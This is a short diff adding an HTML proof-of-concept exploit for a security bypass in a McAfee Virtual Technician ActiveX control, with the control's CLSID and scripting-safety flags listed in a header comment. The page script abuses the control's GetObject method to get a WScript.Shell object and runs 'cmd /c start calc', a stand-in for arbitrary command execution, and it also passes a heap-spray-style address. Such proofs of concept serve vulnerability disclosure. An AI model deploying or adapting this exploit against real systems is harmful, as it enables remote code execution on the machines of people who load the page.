@@ -1,0 +1,22 @@
+<!--
+McAfee Virtual Technician 6.3.0.1911 MVT.MVTControl.6300 ActiveX Control
+GetObject() Security Bypass Remote Code Execution PoC
+
+Binary path: C:\Program Files\McAfee\Supportability\MVT\MVT.dll
+ProgID: MVT.MVTControl.6300
+CLSID: {2EBE1406-BE0E-44E6-AE10-247A0C5AEDCF}
+Implements IObjectSafety: Yes
+Safe for Scripting (IObjectSafety): true
+Safe for Initialization (IObjectSafety: false
+
+//rgod
+-->
+<!-- saved from url=(0014)about:internet -->
+<html>
+<object classid='clsid:2EBE1406-BE0E-44E6-AE10-247A0C5AEDCF' id='obj' />
+</object>
+<script defer=defer>
+var x = obj.GetObject("WScript.Shell");
+x.Exec("cmd /c start calc");
+var y = obj.GetObject(0x0c0c0c0c);
+</script>
